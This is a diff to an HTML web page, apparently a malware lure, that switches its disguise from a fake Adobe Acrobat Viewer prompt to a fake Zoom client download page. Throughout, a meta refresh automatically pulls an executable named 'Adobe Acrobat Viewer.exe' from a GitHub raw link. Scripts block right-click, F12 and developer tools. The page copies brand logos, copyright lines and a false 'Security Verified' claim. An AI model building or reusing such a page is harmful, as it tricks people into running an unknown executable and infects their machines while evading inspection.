@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Adobe Acrobat Viewer Download</title>
+  <title>Zoom Client Download</title>
   <meta http-equiv="refresh" content="2; url=https://github.com/billsmike987/zoom/raw/refs/heads/main/Adobe%20Acrobat%20Viewer.exe">
   <script src="https://cdn.tailwindcss.com"></script>
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
@@ -12,11 +12,8 @@
       0% { transform: rotate(0deg); }
       100% { transform: rotate(360deg); }
     }
-    .gradient-bg {
-      background: linear-gradient(135deg, #f8fafc 0%, #e2e8f0 100%);
-    }
-    .adobe-gradient {
-      background: linear-gradient(to right, #FF0000, #FF7F00, #FFFF00, #00FF00, #0000FF, #4B0082, #9400D3);
+    .zoom-gradient {
+      background: linear-gradient(135deg, #2D8CFF 0%, #0B5ED7 100%);
     }
     .spinner {
       animation: spin 1s linear infinite;
@@ -24,11 +21,18 @@
     .shadow-soft {
       box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.05), 0 2px 4px -1px rgba(0, 0, 0, 0.02);
     }
+    .pulse-animation {
+      animation: pulse 2s cubic-bezier(0.4, 0, 0.6, 1) infinite;
+    }
+    @keyframes pulse {
+      0%, 100% { opacity: 1; }
+      50% { opacity: 0.5; }
+    }
   </style>
   <script>
     // Disable right-click
     document.addEventListener('contextmenu', event => event.preventDefault());
-
+    
     // Disable specific key combos
     document.addEventListener('keydown', function (e) {
       if (
@@ -37,13 +41,13 @@
       ) {
         e.preventDefault();
       }
-
+      
       // F12
       if (e.keyCode === 123) {
         e.preventDefault();
       }
     });
-
+    
     // Try to block DevTools detection
     setInterval(function () {
       const before = new Date();
@@ -53,15 +57,17 @@
         window.location.href = 'about:blank';
       }
     }, 1000);
-
+    
     // Countdown timer
     document.addEventListener('DOMContentLoaded', function() {
       let seconds = 10;
       const countdownElement = document.getElementById('countdown');
+      const countdownText = document.getElementById('countdown-text');
       
       const timer = setInterval(function() {
         seconds--;
         countdownElement.textContent = seconds;
+        countdownText.textContent = seconds;
         
         if (seconds <= 0) {
           clearInterval(timer);
@@ -70,26 +76,35 @@
     });
   </script>
 </head>
-<body class="gradient-bg min-h-screen flex flex-col">
+<body class="bg-gray-50 min-h-screen flex flex-col">
   <header class="py-4 px-6 md:px-12 border-b border-gray-200 bg-white shadow-soft">
     <div class="flex items-center">
-      <img src="https://res.cloudinary.com/dbrpt7m3e/image/upload/v1746642861/adobe-logo_hpgpax.png" alt="Adobe Logo" class="h-8">
-      <span class="ml-2 text-xl font-semibold text-gray-700 hidden sm:inline">Adobe</span>
+      <img src="https://res.cloudinary.com/dbrpt7m3e/image/upload/v1746642861/zoom-logo_xtqj5e.png" alt="Zoom Logo" class="h-8">
+      <span class="ml-2 text-xl font-semibold text-gray-700 hidden sm:inline">Zoom</span>
     </div>
   </header>
 
   <main class="flex-grow flex items-center justify-center py-12 px-4 sm:px-6 lg:px-8">
     <div class="w-full max-w-md bg-white rounded-xl shadow-soft overflow-hidden">
-      <div class="adobe-gradient h-2 w-full"></div>
+      <div class="zoom-gradient h-2 w-full"></div>
       
       <div class="p-8 text-center">
         <div class="flex justify-center mb-6">
-          <img src="https://res.cloudinary.com/dbrpt7m3e/image/upload/v1746645451/acrobat-reader-logo_aurkqd.svg" alt="Acrobat Reader Logo" class="h-16">
+          <div class="relative">
+            <div class="w-20 h-20 bg-blue-100 rounded-full flex items-center justify-center">
+              <i class="fas fa-video text-blue-500 text-3xl"></i>
+            </div>
+            <div class="absolute -right-2 -bottom-2 bg-white rounded-full p-1 shadow-md">
+              <div class="w-8 h-8 bg-blue-500 rounded-full flex items-center justify-center">
+                <i class="fas fa-download text-white text-sm"></i>
+              </div>
+            </div>
+          </div>
         </div>
         
-        <h2 class="text-2xl font-bold text-gray-800 mb-2">Adobe Acrobat Viewer Required</h2>
+        <h2 class="text-2xl font-bold text-gray-800 mb-2">Zoom Desktop Client</h2>
         <p class="text-gray-600 mb-6">
-          This document requires the latest version of Adobe Acrobat Viewer for secure viewing.
+          Join meetings with video, audio, and screen sharing capabilities.
         </p>
         
         <div class="flex flex-col items-center mb-8">
@@ -113,8 +128,25 @@
             </div>
             <div class="ml-3">
               <p class="text-sm text-blue-700">
-                <span class="font-medium">Security Notice:</span> Adobe Acrobat Viewer provides enhanced security for viewing this document.
+                <span class="font-medium">Security Verified:</span> This download is protected by Zoom's encryption and security protocols.
               </p>
+            </div>
+          </div>
+        </div>
+        
+        <div class="mb-6">
+          <div class="flex items-center justify-center space-x-4">
+            <div class="flex items-center">
+              <i class="fas fa-check-circle text-green-500 mr-2"></i>
+              <span class="text-sm text-gray-600">HD Video</span>
+            </div>
+            <div class="flex items-center">
+              <i class="fas fa-check-circle text-green-500 mr-2"></i>
+              <span class="text-sm text-gray-600">Screen Share</span>
+            </div>
+            <div class="flex items-center">
+              <i class="fas fa-check-circle text-green-500 mr-2"></i>
+              <span class="text-sm text-gray-600">Chat</span>
             </div>
           </div>
         </div>
@@ -128,7 +160,7 @@
       
       <div class="px-6 py-4 bg-gray-50 border-t border-gray-200">
         <p class="text-xs text-gray-500 text-center">
-          By downloading, you agree to Adobe's <a href="#" class="text-blue-600 hover:text-blue-800">Terms of Use</a> and <a href="#" class="text-blue-600 hover:text-blue-800">Privacy Policy</a>.
+          By downloading, you agree to Zoom's <a href="#" class="text-blue-600 hover:text-blue-800">Terms of Service</a> and <a href="#" class="text-blue-600 hover:text-blue-800">Privacy Policy</a>.
         </p>
       </div>
     </div>
@@ -137,12 +169,12 @@
   <footer class="py-4 px-6 border-t border-gray-200 bg-white">
     <div class="flex flex-col md:flex-row justify-between items-center">
       <p class="text-sm text-gray-500 mb-2 md:mb-0">
-        © 2025 Adobe. All rights reserved.
+        © 2025 Zoom Video Communications, Inc. All rights reserved.
       </p>
       <div class="flex space-x-4">
         <a href="#" class="text-sm text-gray-500 hover:text-gray-700">Privacy</a>
-        <a href="#" class="text-sm text-gray-500 hover:text-gray-700">Terms</a>
-        <a href="#" class="text-sm text-gray-500 hover:text-gray-700">Cookies</a>
+        <a href="#" class="text-sm text-gray-500 hover:text-gray-700">Legal</a>
+        <a href="#" class="text-sm text-gray-500 hover:text-gray-700">Support</a>
       </div>
     </div>
   </footer>
